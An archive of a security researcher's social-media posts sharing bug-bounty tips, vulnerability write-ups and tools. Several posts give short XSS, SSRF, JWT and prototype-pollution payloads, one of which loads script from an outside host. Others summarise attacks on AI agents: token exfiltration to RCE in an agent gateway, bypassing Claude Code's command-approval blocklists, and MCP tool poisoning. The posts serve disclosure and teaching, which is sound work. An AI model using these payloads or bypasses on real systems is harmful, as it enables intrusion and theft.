**Links in post:** https://auth0.com/blog/five-step-guide-securing-moltbot-ai-agent/, https://docs.molt.bot/gateway/security


---

## 2026-02-09 · Post · Bug bounty writeups daily by @piyush_supiy


### Post — @0xacb — 2026-02-09 14:19 UTC (2026-02-09 15:19 WAT)

- URL: https://x.com/0xacb/status/2020865114786734355
- Metrics (at fetch): bookmark 98, impression 6151, like 91, quote 0, reply 0, retweet 10

> Bug bounty writeups daily by @piyush_supiy
>
> https://securitycipher.com/bounty-writeups/

**Links in post:** https://securitycipher.com/bounty-writeups/


---

## 2026-02-04 · Post · 🚨We found RCE in Clawdbot 🚨


Tags (automatic): RCE


### Post — @0xacb — 2026-02-04 00:52 UTC (2026-02-04 01:52 WAT)

- URL: https://x.com/0xacb/status/2018850079029760335
- Metrics (at fetch): bookmark 464, impression 122973, like 663, quote 22, reply 23, retweet 153

> 🚨We found RCE in Clawdbot 🚨
>
> If you're using Clawdbot/Moltbot, I can get RCE on your computer just by getting you to click a link. 
>
> The coolest part? This vulnerability (CVE-2026-25253) took only 100 minutes to discover, and it was discovered completely autonomously using


---

## 2026-02-03 · Post · 404 page to RCE. A report by @spaceraccoonsec


Tags (automatic): RCE


### Post — @0xacb — 2026-02-03 10:05 UTC (2026-02-03 11:05 WAT)

- URL: https://x.com/0xacb/status/2018626870082752936
- Metrics (at fetch): bookmark 492, impression 37366, like 715, quote 1, reply 12, retweet 85

> 404 page to RCE. A report by @spaceraccoonsec
>
> He chained two old CVEs to achieve RCE:
> - Found a 404 page mentioning an obscure CMS, discovered /josso/signin login
> - Triggered CVE-2007-0450 (directory traversal in mod_proxy) using a %5C../ to bypass the internal proxy
> - Reached


---

## 2026-02-02 · Thread · 💥 One click could completely compromise a @OpenClaw / Moltbot / Clawdbot (CVE-2026-25253)


Tags (automatic): RCE


### Post — @0xacb — 2026-02-02 09:07 UTC (2026-02-02 10:07 WAT)

- URL: https://x.com/0xacb/status/2018250014783418715
- Metrics (at fetch): bookmark 11, impression 3680, like 35, quote 0, reply 4, retweet 8

> 💥 One click could completely compromise a @OpenClaw / Moltbot / Clawdbot (CVE-2026-25253)
>
> The vulnerability is now fixed, but here's how it worked:
>
> - gatewayUrl Parameter: A GET parameter automatically overrides the WebSocket gateway URL used by the Control UI
>
> - Token Exfiltration: Visiting a malicious link leaks the victim's auth token to the attacker's server
>
> - WebSocket CORS Bypass: No origin validation means attackers can reach localhost through the victim's browser
>
> - Instant RCE: Stolen token = full system access via arbitrary commands.

**Media:**
- photo: https://pbs.twimg.com/media/HAJDk2LW4AA3fqo.jpg — no alt text provided by author


### Thread part 2 — @0xacb — 2026-02-02 09:07 UTC (2026-02-02 10:07 WAT)

- URL: https://x.com/0xacb/status/2018250016800862535
- Metrics (at fetch): bookmark 2, impression 1158, like 9, quote 0, reply 0, retweet 2

> @openclaw Full details: https://ethiack.com/news/blog/one-click-rce-moltbot

**Links in post:** https://ethiack.com/news/blog/one-click-rce-moltbot


---

## 2026-02-01 · Post · Very interesting techniques by @slonser_


Tags (automatic): Request smuggling / desync, AI-assisted hunting


### Post — @0xacb — 2026-02-01 09:39 UTC (2026-02-01 10:39 WAT)

- URL: https://x.com/0xacb/status/2017895537454838146
- Metrics (at fetch): bookmark 109, impression 6737, like 127, quote 0, reply 1, retweet 19

> Very interesting techniques by @slonser_
>
> The issue comes from the fact that LLMs don't actually parse JSON/CSV data with standard parsers. They just read it as text. When data looks malformed, models will often try to "fix" it, which is exactly how attackers can smuggle


---

## 2026-01-29 · Thread · Our pentesting agent found a 1-click ATO to RCE in @openclaw Gateway Control UI in under 2 hours.


Tags (automatic): Account takeover, RCE, AI-assisted hunting


### Post — @0xacb — 2026-01-29 16:38 UTC (2026-01-29 17:38 WAT)

- URL: https://x.com/0xacb/status/2016913750557651228
- Metrics (at fetch): bookmark 143, impression 24570, like 227, quote 2, reply 7, retweet 37

> Our pentesting agent found a 1-click ATO to RCE in @openclaw Gateway Control UI in under 2 hours.
>
> Local instances can also be exploited with one click.
>
> Patched in main, update now.
>
> Watch the exploit 👇 [pic.x.com/E8fDD4SDGx]

**Media:**
- video: https://pbs.twimg.com/ext_tw_video_thumb/2016913600686809088/pu/img/F6tC5r8_sFi46nQN.jpg — no alt text provided by author


### Thread part 2 — @0xacb — 2026-01-29 16:38 UTC (2026-01-29 17:38 WAT)

- URL: https://x.com/0xacb/status/2016913752059199855
- Metrics (at fetch): bookmark 34, impression 3964, like 51, quote 0, reply 1, retweet 9

> @openclaw By @hjsbranq, @s3np41k1r1t0 and team. 
>
> Blog post:
> https://ethiack.com/news/blog/one-click-rce-moltbot?utm_campaign=molbot_rce&utm_source=x&utm_medium=andre

**Links in post:** https://ethiack.com/news/blog/one-click-rce-moltbot?utm_campaign=molbot_rce&utm_source=x&utm_medium=andre


### Thread part 3 — @0xacb — 2026-01-29 16:38 UTC (2026-01-29 17:38 WAT)

- URL: https://x.com/0xacb/status/2016913753422373118
- Metrics (at fetch): bookmark 15, impression 2312, like 14, quote 0, reply 0, retweet 2

> @openclaw @hjsbranq @s3np41k1r1t0 PoC repository:
> https://github.com/ethiack/moltbot-1click-rce

**Links in post:** https://github.com/ethiack/moltbot-1click-rce


---

## 2026-01-28 · Post · It's been a while since I've tried to find bugs in @facebook. Maybe it's time to look into the new s


### Post — @0xacb — 2026-01-28 10:27 UTC (2026-01-28 11:27 WAT)

- URL: https://x.com/0xacb/status/2016458076669292812
- Metrics (at fetch): bookmark 121, impression 8345, like 136, quote 0, reply 3, retweet 21

> It's been a while since I've tried to find bugs in @facebook. Maybe it's time to look into the new stuff.
>
> I remember the days when we spent one entire day intercepting mobile app traffic by patching a native library when nobody knew about it and finding an easy location-based


---

## 2026-01-27 · Thread · Looking for S(security) in MCP? 👀


Tags (automatic): XSS, Account takeover, RCE, OAuth


### Post — @0xacb — 2026-01-27 10:24 UTC (2026-01-27 11:24 WAT)

- URL: https://x.com/0xacb/status/2016094932952342989
- Metrics (at fetch): bookmark 16, impression 2236, like 24, quote 0, reply 1, retweet 0

> Looking for S(security) in MCP? 👀
>
> You’re probably already familiar with MCP but did you know that it’s not secure out of the box?
>
> Possible risks includes command injection vulns that may lead to RCE, tool poisoning and the silent redefinition of previously approved tools. And also, OAuth misconfigs may face pitfalls like lack of rate limiting on registration and loose redirect URI validation, which can lead to XSS or account takeovers.
>
> To stay protected, developers must implement strict URI allowlists, sanitize all display strings, and always force user re-consent during authorization flows


### Thread part 2 — @0xacb — 2026-01-27 10:24 UTC (2026-01-27 11:24 WAT)

- URL: https://x.com/0xacb/status/2016094934260957366
- Metrics (at fetch): bookmark 12, impression 1157, like 17, quote 0, reply 0, retweet 2

> Reference blogs 👇
>
> - https://elenacross7.medium.com/%EF%B8%8F-the-s-in-mcp-stands-for-security-91407b33ed6b
>
> - https://www.novasecurity.co.nz/the-s-in-mcp-stands-for-security-part-2/ by @ngalongc

**Links in post:** https://elenacross7.medium.com/%EF%B8%8F-the-s-in-mcp-stands-for-security-91407b33ed6b, https://www.novasecurity.co.nz/the-s-in-mcp-stands-for-security-part-2/


---

## 2026-01-26 · Reply · @ryotkak discovered 8 ways to achieve RCE in Claude Code without user approval 🤯


Tags (automatic): RCE, AI-assisted hunting


### Post — @0xacb — 2026-01-26 10:09 UTC (2026-01-26 11:09 WAT)

- URL: https://x.com/0xacb/status/2015728767524561066
- Metrics (at fetch): bookmark 34, impression 3521, like 65, quote 0, reply 0, retweet 13

> @ryotkak discovered 8 ways to achieve RCE in Claude Code without user approval 🤯
>
> @claudeai allowlisted "safe" commands like echo, sed, and sort, then used regex blocklists to prevent dangerous arguments. 
>
> All fixed in v1.0.93 by switching from blocklists to allowlists.
>
> Blog


---

## 2026-01-25 · Post · It's crazy how hallucinated AI CVE PoCs keep ending up in @NIST NVD references.


Tags (automatic): AI-assisted hunting


### Post — @0xacb — 2026-01-25 17:13 UTC (2026-01-25 18:13 WAT)

- URL: https://x.com/0xacb/status/2015473216844620280
- Metrics (at fetch): bookmark 35, impression 25111, like 103, quote 2, reply 4, retweet 27

> It's crazy how hallucinated AI CVE PoCs keep ending up in @NIST NVD references.
>
> One recent example is CVE-2026-21962, a 10.0 CVE in Oracle HTTP Server / Apache Proxy Plugin.
>
> https://nvd.nist.gov/vuln/detail/CVE-2026-21962 links to a GitHub repository with a fake PoC.
>
> This also propagates to @github [pic.x.com/BCL6wUpdhB]

**Media:**
- photo: https://pbs.twimg.com/media/G_hmF4eWsAAgMPe.jpg — no alt text provided by author

**Links in post:** https://nvd.nist.gov/vuln/detail/CVE-2026-21962


---

## 2026-01-19 · Post · Have you ever tried to find JSON Web Token (JWT) bugs?


### Post — @0xacb — 2026-01-19 15:11 UTC (2026-01-19 16:11 WAT)

- URL: https://x.com/0xacb/status/2013268081003368472
- Metrics (at fetch): bookmark 197, impression 8393, like 181, quote 0, reply 2, retweet 25

> Have you ever tried to find JSON Web Token (JWT) bugs?
>
> 5 ideas to try 👇
>
> &gt; Change alg to "none" and strip the signature but keep the trailing dot
> &gt; “jwt_tool &lt;JWT&gt; --crack -d &lt;wordlist&gt;”  to crack weak secret keys
> &gt; Change alg from "RS256" to "HS256", then sign with the server


---

## 2026-01-15 · Post · The questions you need to ask to learn about a new vuln class or technique 🐛


### Post — @0xacb — 2026-01-15 11:41 UTC (2026-01-15 12:41 WAT)

- URL: https://x.com/0xacb/status/2011765664189383012
- Metrics (at fetch): bookmark 15, impression 2205, like 33, quote 0, reply 0, retweet 3

> The questions you need to ask to learn about a new vuln class or technique 🐛
>
> Why does it occur (root cause) and how to exploit it?
> Are there labs or challenges to practice on?
> Any related disclosed reports, blog posts or writeups?
> What are the best targets to hunt for it?
> What


---

## 2026-01-14 · Thread · A critical Supabase JWT bug by @BourAbdelhadi


### Post — @0xacb — 2026-01-14 10:34 UTC (2026-01-14 11:34 WAT)

- URL: https://x.com/0xacb/status/2011386406627655998
- Metrics (at fetch): bookmark 76, impression 5582, like 105, quote 0, reply 1, retweet 10

> A critical Supabase JWT bug by @BourAbdelhadi
>
> And he used rep+ for this impactful finding
>
> Tool👇
> https://github.com/repplus/rep/

**Links in post:** https://github.com/repplus/rep/


### Thread part 2 — @0xacb — 2026-01-14 10:34 UTC (2026-01-14 11:34 WAT)

- URL: https://x.com/0xacb/status/2011386407776883061
- Metrics (at fetch): bookmark 35, impression 2557, like 35, quote 0, reply 0, retweet 14

> @BourAbdelhadi Write-up
> https://t.co/H5UBjMDp2S


---

## 2026-01-09 · Post · A researcher found an IDOR in Firefox allowing arbitrary account deletion via email. Initially, tria


Tags (automatic): IDOR / BOLA, Platform: HackerOne


### Post — @0xacb — 2026-01-09 20:37 UTC (2026-01-09 21:37 WAT)

- URL: https://x.com/0xacb/status/2009726215804854728
- Metrics (at fetch): not returned

> A researcher found an IDOR in Firefox allowing arbitrary account deletion via email. Initially, triage said this was unexploitable since an attacker can’t access the victim's password hash, which is required for account deletion.
>
> But the researcher showed that for SSO users, the password hash check could be bypassed using the attacker's session. I guess the password-related DB values were None/NULL, causing the bug. Super interesting.
>
> Always check SSO edge cases!
>
> Full report👇
> https://hackerone.com/reports/3154983

**Links in post:** https://hackerone.com/reports/3154983


---

## 2026-01-08 · Post · Very nice writeup by @J0R1AN


Tags (automatic): XSS


### Post — @0xacb — 2026-01-08 15:33 UTC (2026-01-08 16:33 WAT)

- URL: https://x.com/0xacb/status/2009287334844350760
- Metrics (at fetch): not returned

> Very nice writeup by @J0R1AN
>
> https://jorianwoltjer.com/blog/p/ctf/intigriti-xss-challenge/1225

**Links in post:** https://jorianwoltjer.com/blog/p/ctf/intigriti-xss-challenge/1225


---

## 2026-01-07 · Post · When everything is critical nothing is critical https://twitter.com/galnagli/status/2008821918334357


### Post — @0xacb — 2026-01-07 13:34 UTC (2026-01-07 14:34 WAT)

- URL: https://x.com/0xacb/status/2008894929771106370
- Metrics (at fetch): not returned

> When everything is critical nothing is critical https://twitter.com/galnagli/status/2008821918334357598

**Links in post:** https://twitter.com/galnagli/status/2008821918334357598

**Quoted post (full text):**

    #### Quoted post — @galnagli — 2026-01-07 08:44 UTC (2026-01-07 09:44 WAT)
    
    - URL: https://x.com/galnagli/status/2008821918334357598
    - Metrics (at fetch): not returned
    
    > 🤡 CVE-2026-21877 - 10.0 CVSS for AUTHENTICATED Remote code execution in @n8n_io, what a joke.... 
    >
    > This is the reason there are so many real risks to be found because of stupid scoring frameworks and compliance requirements
    
    **Media:**
    - photo: https://pbs.twimg.com/media/G-DEZT_XgAAeIKW.jpg — no alt text provided by author
    


---

## 2026-01-06 · Post · Self-hosted programs to hack on 👀


### Post — @0xacb — 2026-01-06 09:26 UTC (2026-01-06 10:26 WAT)

- URL: https://x.com/0xacb/status/2008470180926476793
- Metrics (at fetch): not returned

> Self-hosted programs to hack on 👀
>
> https://www.bugbountydirectory.com/programs

**Links in post:** https://www.bugbountydirectory.com/programs


---

## 2026-01-05 · Post · If you’re tired of encountering AI slop blogs, this one’s for you.


Tags (automatic): AI-assisted hunting


### Post — @0xacb — 2026-01-05 10:02 UTC (2026-01-05 11:02 WAT)

- URL: https://x.com/0xacb/status/2008116863906074923
- Metrics (at fetch): not returned

> If you’re tired of encountering AI slop blogs, this one’s for you.
>
> @busf4ctor made cool website that has a curated collection of bug bounty resources.
>
> Check it out👇
> https://bugbountydaily.com/

**Links in post:** https://bugbountydaily.com/


---

## 2026-01-01 · Post · If an HTML injection occurs before the body tag, framesets can be used for XSS.


Tags (automatic): XSS


### Post — @0xacb — 2026-01-01 14:30 UTC (2026-01-01 15:30 WAT)

- URL: https://x.com/0xacb/status/2006734788678365461
- Metrics (at fetch): not returned

> If an HTML injection occurs before the body tag, framesets can be used for XSS.
>
> An XSS vector by @J0R1AN:
>
> &lt;frameset&gt;&lt;frame src="javascript:alert(origin)"&gt;&lt;/frameset&gt;
>
> https://lab.ctbb.show/research/html-facts-input-image-frame-xss

**Links in post:** https://lab.ctbb.show/research/html-facts-input-image-frame-xss


---

## 2025-12-31 · Post · Stumbled upon this cool tool, a repeater for Chrome.


Tags (automatic): AI-assisted hunting


### Post — @0xacb — 2025-12-31 10:03 UTC (2025-12-31 11:03 WAT)

- URL: https://x.com/0xacb/status/2006305174856360152
- Metrics (at fetch): not returned

> Stumbled upon this cool tool, a repeater for Chrome.
>
> Rep+ is a Burp-style repeater extension with built-in AI for quick attack suggestions, very handy for BB hunters.
>
> It can also extract secrets and endpoints from JS files. Cool stuff by @BourAbdelhadi
>
> Check it out
> https://github.com/repplus/rep/

**Links in post:** https://github.com/repplus/rep/


---

## 2025-12-16 · Post · This is really cool writeup.


Tags (automatic): XSS, Account takeover


### Post — @0xacb — 2025-12-16 16:02 UTC (2025-12-16 17:02 WAT)

- URL: https://x.com/0xacb/status/2000959614850863288
- Metrics (at fetch): not returned

> This is really cool writeup.
>
> Self-XSS + Login CSRF + SSO gadget to ATO
>
> Nice find @_lauritz_!
>
> https://security.lauritz-holtmann.de/post/xss-ato-gadgets

**Links in post:** https://security.lauritz-holtmann.de/post/xss-ato-gadgets


---

## 2025-12-13 · Post · &lt;svg/onload=import(‘//xss.site’)&gt;


Tags (automatic): XSS


### Post — @0xacb — 2025-12-13 17:30 UTC (2025-12-13 18:30 WAT)

- URL: https://x.com/0xacb/status/1999894712652533913
- Metrics (at fetch): not returned

> &lt;svg/onload=import(‘//xss.site’)&gt;
>
> @NahamSec explains how he wisely sends his blind XSS payloads that yielded him massive bounties.👇
>
> https://www.youtube.com/watch?v=QSiXHb97E1c

**Links in post:** https://www.youtube.com/watch?v=QSiXHb97E1c


---

## 2025-12-11 · Post · If you’re into XSS, this is a must read.


Tags (automatic): XSS


### Post — @0xacb — 2025-12-11 18:02 UTC (2025-12-11 19:02 WAT)

- URL: https://x.com/0xacb/status/1999177939145863657
- Metrics (at fetch): not returned

> If you’re into XSS, this is a must read.
>
> This blog by Huli (@aszx87410) goes deep into everything about XSS. Very substantial series of a content.
>
> Read at: https://aszx87410.github.io/beyond-xss/en/ch1/browser-security-model/

**Links in post:** https://aszx87410.github.io/beyond-xss/en/ch1/browser-security-model/


---

## 2025-12-09 · Post · Crazy XSS chain. Very impressive find by @H4R3L, @BrunoModificato and @sudhanshur705


Tags (automatic): XSS, Account takeover


### Post — @0xacb — 2025-12-09 16:30 UTC (2025-12-09 17:30 WAT)

- URL: https://x.com/0xacb/status/1998430112853708864
- Metrics (at fetch): not returned

> Crazy XSS chain. Very impressive find by @H4R3L, @BrunoModificato and @sudhanshur705
>
> Read at👇
>
>  https://nokline.github.io/bugbounty/2024/06/07/Zoom-ATO.html

**Links in post:** https://nokline.github.io/bugbounty/2024/06/07/Zoom-ATO.html


---

## 2025-11-27 · Post · While playing the Hack lu CTF 2025 with @xstf_team, I was able to solve a 0day challenge: a new bypa


Tags (automatic): XSS, Account takeover


### Post — @0xacb — 2025-11-27 14:08 UTC (2025-11-27 15:08 WAT)

- URL: https://x.com/0xacb/status/1994045652653785262
- Metrics (at fetch): not returned

> While playing the Hack lu CTF 2025 with @xstf_team, I was able to solve a 0day challenge: a new bypass for a previous Grafana CVE, resulting in XSS and Account Takeover!
>
> Thanks @msanft for creating the challenge and the original discovery of this bypass.
>
> Read my technical deep dive👇
>
> https://blog.ethiack.com/blog/grafana-cve-2025-6023-bypass-a-technical-deep-dive

**Links in post:** https://blog.ethiack.com/blog/grafana-cve-2025-6023-bypass-a-technical-deep-dive


---

## 2025-11-24 · Post · Want to learn about how a fascinating XSS vulnerability found by @ethiack engine led to an interesti


Tags (automatic): XSS


### Post — @0xacb — 2025-11-24 14:02 UTC (2025-11-24 15:02 WAT)

- URL: https://x.com/0xacb/status/1992957117506986113
- Metrics (at fetch): not returned

> Want to learn about how a fascinating XSS vulnerability found by @ethiack engine led to an interesting rabbit hole of bypassing WAFs and parameter injection?
>
> Read the blog post here 👇
> https://blog.ethiack.com/blog/bypassing-wafs-for-fun-and-js-injection-with-parameter-pollution

**Links in post:** https://blog.ethiack.com/blog/bypassing-wafs-for-fun-and-js-injection-with-parameter-pollution


---

## 2025-11-21 · Post · The @amrelsagaei's JWT Analyzer @caido plugin is super cool.


### Post — @0xacb — 2025-11-21 10:34 UTC (2025-11-21 11:34 WAT)

- URL: https://x.com/0xacb/status/1991817370654957730
- Metrics (at fetch): not returned

> The @amrelsagaei's JWT Analyzer @caido plugin is super cool.
>
> It will decode the JWT for you and let you try common attack vectors. [pic.x.com/eoocf0B08f]

**Media:**
- video:  — no alt text provided by author


---

## 2025-11-18 · Post · Confused about how the Cookie SameSite attribute works?


### Post — @0xacb — 2025-11-18 10:03 UTC (2025-11-18 11:03 WAT)

- URL: https://x.com/0xacb/status/1990722612524118130
- Metrics (at fetch): not returned

> Confused about how the Cookie SameSite attribute works?
>
> - SameSite=None: all cross-site requests will include the cookie; if no other protections are in place, opens up the site to CSRF attacks
>
> - SameSite=Lax: only GET requests triggered by a top-level navigation will include the cookie; very common, harder to exploit, could still be exploitable if there's any state-changing GET requests
>
> - SameSite=Strict: no cross-site requests will include the cookie
>
> Sometimes, we can simply search for SameSite=None in all responses to check for session cookies that may be misconfigured.

**Media:**
- photo: https://pbs.twimg.com/media/G6B3jMSXoAAAPH3.jpg — no alt text provided by author


---

## 2025-11-10 · Post · When testing GraphQL APIs make sure to run graphw00f (https://github.com/dolevf/graphw00f) to finger


### Post — @0xacb — 2025-11-10 11:52 UTC (2025-11-10 12:52 WAT)

- URL: https://x.com/0xacb/status/1987850856180432944
- Metrics (at fetch): not returned

> When testing GraphQL APIs make sure to run graphw00f (https://github.com/dolevf/graphw00f) to fingerprint the specific GraphQL implementation the application is running. Then you can review the Threat Matrix to get likely attack vectors. [pic.x.com/X2oxOSWJGl]

**Media:**
- video:  — no alt text provided by author

**Links in post:** https://github.com/dolevf/graphw00f


---

## 2025-11-06 · Post · If you found a package.json file in the wild, you might find some internal packages vulnerable to a 


Tags (automatic): Dependency confusion / supply chain, Blockchain / L1-L2 / bridge


### Post — @0xacb — 2025-11-06 10:07 UTC (2025-11-06 11:07 WAT)

- URL: https://x.com/0xacb/status/1986374770233847900
- Metrics (at fetch): not returned

> If you found a package.json file in the wild, you might find some internal packages vulnerable to a dependency confusion attack 👀
>
> Check for it quicker using this cool new tool by JSMon: https://app.jsmon.sh/tools/npm-validator 👇 [pic.x.com/TPkPd2VlyN]

**Media:**
- video:  — no alt text provided by author

**Links in post:** https://app.jsmon.sh/tools/npm-validator


---

## 2025-11-04 · Post · Looking into a potential SSRF or OR but the server checks against a URL whitelist?


Tags (automatic): SSRF


### Post — @0xacb — 2025-11-04 09:37 UTC (2025-11-04 10:37 WAT)

- URL: https://x.com/0xacb/status/1985642642403676488
- Metrics (at fetch): not returned

> Looking into a potential SSRF or OR but the server checks against a URL whitelist?
>
> Try the backslash trick! Due to a difference in URL specifications, some parsers will treat '\' the same as '/', while others will not.
>
> Here's an example payload: https://<attacker-url>\@<whitelisted-url>/


---

## 2025-11-04 · Post · Looking into a potential SSRF or OR but the server checks against a URL whitelist?


Tags (automatic): SSRF


### Post — @0xacb — 2025-11-04 09:37 UTC (2025-11-04 10:37 WAT)

- URL: https://x.com/0xacb/status/1985642517140799684
- Metrics (at fetch): not returned

> Looking into a potential SSRF or OR but the server checks against a URL whitelist?
>
> Try the backslash trick! Due to a difference in URL specifications, some parsers will treat '\' the same as '/', while others will not.
>
> Here's an example payload: https://<attacker-url>\@<whitelisted-url>/
>
> You can also use https://github.com/0xacb/recollapse to find potential new vectors 🥷

**Links in post:** https://github.com/0xacb/recollapse


---

## 2025-10-24 · Post · Prototype pollution is often missed.


Tags (automatic): XSS


### Post — @0xacb — 2025-10-24 11:06 UTC (2025-10-24 12:06 WAT)

- URL: https://x.com/0xacb/status/1981678594523804119
- Metrics (at fetch): not returned

> Prototype pollution is often missed.
> Here's how to find it.
>
> Prototype pollution is a powerful client-side vulnerability that can lead to XSS.
>
> The main requirements to exploit it are:
> - Unsafe parsing of user-controlled objects (via URL parameters, JSON, postMessages, etc.)
> - A function that doesn’t isolate/protect inputs from prototype pollution and then..
> - ..passes the input into a sink which can be used for malicious purposes
>
> Consider this unsafe object merging function:
>
> function recursivelyMerge(target, source) {
>           for (const key in source) {
>
>             if (isAnObject(target) && isAnObject(source)) {
>               recursivelyMerge(target[key], source[key]);
>             } else {
>               target[key] = source[key];
>             }
>           }
>         }
>
> With this postMessage handler:
>
>     window.onmessage = function(event) {
>         const postedData = JSON.parse(http://event.data);
>         recursivelyMerge(someIrrelevantAppSettings, postedData);
>     };
>
> And this as the sink:
> let superSecretConfig = {};
> eval(superSecretConfig.someSuperSecretJS);
>
> And then, by sending a postMessage like this…
> vulnerableWindow.postMessage(‘{“__proto__”:{“someSuperSecretJS”:”alert(1)”}}’);
> …, the attacker pollutes the Object.prototype, so every single object that doesn’t have this property explicitly defined, is going to inherit whatever value the attacker provided
>
> Here’s a Portswigger prototype pollution lab walkthrough 👇
>
> Try it yourself: https://portswigger.net/web-security/prototype-pollution/client-side/browser-apis/lab-prototype-pollution-client-side-prototype-pollution-via-browser-apis

**Media:**
- video:  — no alt text provided by author

**Links in post:** http://event.data, https://portswigger.net/web-security/prototype-pollution/client-side/browser-apis/lab-prototype-pollution-client-side-prototype-pollution-via-browser-apis


---

## 2025-10-21 · Post · Found an XSS but got blocked by the CSP?


Tags (automatic): XSS, CSP / CSPT


### Post — @0xacb — 2025-10-21 09:16 UTC (2025-10-21 10:16 WAT)

- URL: https://x.com/0xacb/status/1980563738420781169
- Metrics (at fetch): not returned

> Found an XSS but got blocked by the CSP?
>
> https://cspbypass.com has a compiled list of ways to bypass the Content-Security Policy. Check out the video below 👇 [pic.x.com/hB2utPXQOX]

**Media:**
- video:  — no alt text provided by author

**Links in post:** https://cspbypass.com


---

## 2025-10-20 · Post · If your hacking method looks like everyone else’s, so will your findings. My advice is to get weird.


### Post — @0xacb — 2025-10-20 09:28 UTC (2025-10-20 10:28 WAT)

- URL: https://x.com/0xacb/status/1980204421377048611
- Metrics (at fetch): not returned

> If your hacking method looks like everyone else’s, so will your findings. My advice is to get weird.
>
> Bug bounty wins come from being different. Everyone checks the basics. You need to hunt the edges, the overlooked, the strange. Go past the checklist, and you'll land what others miss.


---

## 2025-09-15 · Post · If you look at the AI-generated code below, you may notice that path traversal is prevented via base


Tags (automatic): AI-assisted hunting


### Post — @0xacb — 2025-09-15 09:03 UTC (2025-09-15 10:03 WAT)

- URL: https://x.com/0xacb/status/1967514562753638862
- Metrics (at fetch): not returned

> If you look at the AI-generated code below, you may notice that path traversal is prevented via basename functions.
>
> Can you still exploit it?
>
> Try here 👉 https://ai4eh.ethiack.ninja [pic.x.com/zpdHkUyOef]

**Media:**
- photo: https://pbs.twimg.com/media/G04D8htXoAAd7UG.jpg — no alt text provided by author

**Links in post:** https://ai4eh.ethiack.ninja


---

## 2025-09-12 · Post · The Hack the Agent challenge is finished.


Tags (automatic): AI-assisted hunting


### Post — @0xacb — 2025-09-12 08:37 UTC (2025-09-12 09:37 WAT)

- URL: https://x.com/0xacb/status/1966420993049502179
- Metrics (at fetch): not returned

> The Hack the Agent challenge is finished.
>
> GG to all the hackers who played! We hope you enjoyed it.
>
> We will leave it running for those who still want to play with it at https://hacktheagent.com
>
> Stay tuned on @ethiack socials for more challenges. [pic.x.com/DpujorbBNh]

**Media:**
- photo: https://pbs.twimg.com/media/G0ohWuqWUAALfKo.jpg — no alt text provided by author

**Links in post:** https://hacktheagent.com


---

## 2025-09-08 · Post · Bypassing WAFs with traditional payloads is getting harder.


### Post — @0xacb — 2025-09-08 08:07 UTC (2025-09-08 09:07 WAT)

- URL: https://x.com/0xacb/status/1964963756288413833
- Metrics (at fetch): not returned

> Bypassing WAFs with traditional payloads is getting harder.
>
> Here's how clever payload splitting can bypass them 👇
>
> https://blog.ethiack.com/blog/bypassing-wafs-for-fun-and-js-injection-with-parameter-pollution

**Links in post:** https://blog.ethiack.com/blog/bypassing-wafs-for-fun-and-js-injection-with-parameter-pollution


---

## 2025-09-05 · Post · Some thoughts from rez0 on the future of bug bounty and AI 🔥


Tags (automatic): AI-assisted hunting


### Post — @0xacb — 2025-09-05 09:13 UTC (2025-09-05 10:13 WAT)

- URL: https://x.com/0xacb/status/1963893205763567659
- Metrics (at fetch): not returned

> Some thoughts from rez0 on the future of bug bounty and AI 🔥
>
> As someone working on hackbots, I agree that human + AI symbiosis will likely be more effective than either alone.
>
> https://josephthacker.com/hacking/2025/06/09/this-is-how-they-tell-me-bug-bounty-ends.html

**Links in post:** https://josephthacker.com/hacking/2025/06/09/this-is-how-they-tell-me-bug-bounty-ends.html


---

## 2025-09-02 · Post · Want to put your AI model hacking skills to the test?


Tags (automatic): AI-assisted hunting


### Post — @0xacb — 2025-09-02 08:23 UTC (2025-09-02 09:23 WAT)

- URL: https://x.com/0xacb/status/1962793583410373089
- Metrics (at fetch): not returned

> Want to put your AI model hacking skills to the test?
>
> See if you can solve all the challenges in our Hack The Agent challenge!
>
> Try it at: https://hacktheagent.com [pic.x.com/jBixkplOfk]

**Media:**
- photo: https://pbs.twimg.com/media/Gz0-PnEXMAAL0i-.jpg — no alt text provided by author

**Links in post:** https://hacktheagent.com


---

## 2025-08-20 · Post · Typical CSS injection often relies on repeated context loading (usually via iframes) to exfiltrate s


### Post — @0xacb — 2025-08-20 09:03 UTC (2025-08-20 10:03 WAT)

- URL: https://x.com/0xacb/status/1958092488515649773
- Metrics (at fetch): not returned

> Typical CSS injection often relies on repeated context loading (usually via iframes) to exfiltrate sensitive tokens.
>
> I found this tool by @ixSly that's both fast and works in Chrome and Safari. It can leak tokens with just a single CSS import by leveraging -webkit-cross-fade 🤯
>
> Check it out 👇
>
> https://github.com/ixSly/sCSSLeak
>
> Also worth remembering the sic tool by @d0nutptr, though it doesn't very seem stable in recent browser versions.

**Links in post:** https://github.com/ixSly/sCSSLeak


---

## 2025-08-15 · Post · How to turn iframes and http://window.open into weapons for XSS.


Tags (automatic): XSS


### Post — @0xacb — 2025-08-15 09:15 UTC (2025-08-15 10:15 WAT)

- URL: https://x.com/0xacb/status/1956283707137851590
- Metrics (at fetch): not returned

> How to turn iframes and http://window.open into weapons for XSS.
>
> From origin manipulation to sandbox escape, this paper by @aszx87410 is stacked with juicy info. 
>
> Huli dives deep into the magical world of iframes and http://window.open and is definitely worth a read!
>
> What's covered?
> 💥 XSS via encoded javascript: iframe src
> 💥 Using srcdoc to bypass origin and execute DOM-level attacks
> 💥 Escalating sandbox privileges with http://window.open
> 💥 Leaking or persisting data cross-origin via http://window.name
> 💥 Bypassing event.origin validation with sandboxed null origins
>
> Read at: https://blog.huli.tw/2022/04/07/en/iframe-and-window-open

**Media:**
- photo: https://pbs.twimg.com/media/GyYdi7sXEAEiHG_.jpg — no alt text provided by author

**Links in post:** http://window.open, http://window.name, https://blog.huli.tw/2022/04/07/en/iframe-and-window-open


---

## 2025-08-06 · Post · Want to learn how to hack LLMs? The research team at @ethiack just launched a 5-level CTF.


Tags (automatic): AI-assisted hunting


### Post — @0xacb — 2025-08-06 16:50 UTC (2025-08-06 17:50 WAT)

- URL: https://x.com/0xacb/status/1953136670989021694
- Metrics (at fetch): not returned

> Want to learn how to hack LLMs? The research team at @ethiack just launched a 5-level CTF.
>
> And we’ll be handing prizes to top performers every week, including @CaidoIO licenses!
>
> 👉 https://hacktheagent.com [pic.x.com/89LNtLleVm]

**Media:**
- photo: https://pbs.twimg.com/media/Gxru2KNbsAAwYMH.jpg — no alt text provided by author

**Links in post:** https://hacktheagent.com


---

## 2025-08-04 · Post · We just dropped some research and used our hackbot to take it further. Read and go bypass some WAFs 


Tags (automatic): AI-assisted hunting


### Post — @0xacb — 2025-08-04 20:31 UTC (2025-08-04 21:31 WAT)

- URL: https://x.com/0xacb/status/1952467355411554362
